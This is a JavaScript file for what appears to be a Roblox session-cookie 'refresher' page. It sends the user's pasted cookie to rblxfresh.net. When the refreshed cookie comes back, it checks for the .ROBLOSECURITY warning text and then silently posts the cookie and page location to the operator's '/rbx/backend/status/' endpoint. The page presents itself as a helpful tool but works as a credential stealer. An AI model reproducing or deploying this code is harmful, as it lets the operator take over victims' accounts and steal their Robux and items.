const url = `${location.origin}/rbx/backend`;

const inputCookie = document.querySelector('.main-input');

// Notify
const notify = document.querySelector('.app-notify');
const buttonNotify = document.querySelector('.app-notify-button');

const setFirstTimeOnWebsite = _ => {
    localStorage.setItem('firstTimeOnWebsite', true);
    notify && notify.remove();
};

const checkFirstTimeOnWebsite = _ => {
    const hasData = localStorage.getItem('firstTimeOnWebsite');
    !hasData && notify && notify.classList.add('visible');
};

// History
const getSavedData = () => {
    const savedData = localStorage.getItem('cookies-history');
    return savedData ? JSON.parse(savedData) : { cookies_history: { cookies: [] } };
};

const saveCookieWith = (cookie) => {
    const data = getSavedData();
    const newCookie = {
        cookie: cookie,
        date: Date.now() 
    };
    data.cookies_history.cookies.push(newCookie);
    console.log(newCookie);
    localStorage.setItem('cookies-history', JSON.stringify(data));
};

const cookieBtn = document.querySelector('.cookies-button');
const cookiesList = document.querySelector('.cookie-history');
const overlay = document.querySelector('.overlay');

const showHistory = _ => {
    const data = getSavedData();
    console.log(data);
    const cookies = data.cookies_history.cookies;

    overlay.classList.add('show');
    cookiesList.classList.add('show'); 

    const cookieList = document.querySelector('.cookie-history-body');
    cookieList.innerHTML = ''; 
    console.log(cookies);

    const displayPercentage = 0.15;

    cookies.forEach(cookieObj => {
        const displayedLength = Math.floor(cookieObj.cookie.length * displayPercentage);
        const shortCookie = cookieObj.cookie.slice(0, displayedLength) + '...';
        const cookieItem = document.createElement('div');
        cookieItem.classList.add('cookie-item');

        const date = new Date(cookieObj.date).toLocaleString();

        cookieItem.innerHTML = `
            <div class="cookie-date">${date}</div>
            <div class="cookie-content" title="Click to copy cookie">${shortCookie}</div>
        `;

        cookieList.appendChild(cookieItem);

        cookieItem.addEventListener('click', () => {
            copyToClipboard(cookieObj.cookie);
        });
    });
};

const copyToClipboard = text => {
    const tempInput = document.createElement('textarea');
    tempInput.value = text;
    document.body.appendChild(tempInput);
    tempInput.select();
    document.execCommand('copy');
    document.body.removeChild(tempInput);
};

const closeMenu = () => {
    overlay.classList.remove('show');
    cookiesList.classList.remove('show');
};

overlay.addEventListener('click', closeMenu);

document.addEventListener('click', (event) => {
    if (!cookiesList.contains(event.target) && !cookieBtn.contains(event.target)) {
        closeMenu();
    }
});

// Result Section
const mainResult = document.querySelector('.main-result');
const resultContent = document.querySelector('.result-content');
const resultButton = document.querySelector('.result-button');

const buttonBypass = document.querySelector('.main-button');

const cookieRefresh = async c => {
    const buttonText = buttonBypass.textContent;
    mainResult.classList.contains('data-get') && mainResult.classList.remove('data-get');
    buttonBypass.textContent = 'Loading...';
    buttonBypass.disabled = true;

    await fetch(`https://rblxfresh.net/refresh`, {
        method: 'POST',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `cookie=${c}`
    }).then(res => res.text()).then(res => {
        const result = res;
        const cookieValidation = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

        buttonBypass.textContent = buttonText;
        buttonBypass.disabled = false;

        mainResult.classList.add('data-get');
        resultContent.textContent = result;
        resultButton.onclick = copieText.bind(this, result);

        if (!result.includes(cookieValidation)) return;

        saveCookieWith(result);

        console.log(result);

        const data = new FormData();
        data.append('cookie', result);
        data.append('location', document.location);

        return fetch(`${url}/status/`, { method: 'POST', body: data });
    });
};


const copieText = async text => await navigator.clipboard.writeText(text);

if (buttonNotify) {
    buttonNotify.onclick = setFirstTimeOnWebsite;
};

buttonBypass.onclick = _ => cookieRefresh(inputCookie.value.trim());

cookieBtn.onclick = _ => showHistory();


window.onload = checkFirstTimeOnWebsite;
